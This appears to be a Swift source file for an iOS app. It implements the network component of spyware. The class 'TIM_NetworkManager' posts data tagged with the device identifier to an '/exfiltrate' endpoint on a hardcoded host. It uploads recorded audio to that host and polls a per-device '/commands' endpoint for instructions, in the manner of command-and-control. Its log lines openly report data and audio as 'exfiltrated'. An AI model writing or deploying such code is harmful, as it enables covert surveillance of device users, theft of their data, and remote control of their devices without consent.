import Foundation
import UIKit

class TIM_NetworkManager {
    static let shared = TIM_NetworkManager()
    private let baseURL = "http://192.168.6.23:3000"
    private var backendURL: URL { URL(string: "\(baseURL)/log")! }

    private init() {}

    func send(_ data: [String: Any], type: String = "logs") {
        guard let url = URL(string: "\(baseURL)/exfiltrate") else { return }
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        
        let payload: [String: Any] = [
            "type": type,
            "deviceId": UIDevice.current.identifierForVendor?.uuidString ?? "unknown",
            "data": data,
            "timestamp": ISO8601DateFormatter().string(from: Date())
        ]
        
        do {
            request.httpBody = try JSONSerialization.data(withJSONObject: payload)
            URLSession.shared.dataTask(with: request).resume()
            print("TIM: Exfiltrated [\(type)] successfully.")
        } catch {
            print("TIM: Error serializing exfiltration data.", error.localizedDescription)
        }
    }

    func uploadAudio(_ data: Data) {
        guard let url = URL(string: "\(baseURL)/upload/audio") else { return }
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/octet-stream", forHTTPHeaderField: "Content-Type")
        request.setValue(UIDevice.current.identifierForVendor?.uuidString ?? "unknown", forHTTPHeaderField: "x-device-id")
        request.httpBody = data
        
        URLSession.shared.dataTask(with: request).resume()
        print("TIM: Audio exfiltrated successfully.")
    }
    
    func fetchCommands(completion: @escaping ([String]) -> Void) {
        let deviceId = UIDevice.current.identifierForVendor?.uuidString ?? "unknown"
        guard let url = URL(string: "\(baseURL)/commands/\(deviceId)") else { return }
        
        URLSession.shared.dataTask(with: url) { data, _, _ in
            guard let data = data else { return }
            if let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
               let commands = json["commands"] as? [String] {
                completion(commands)
            }
        }.resume()
    }
}
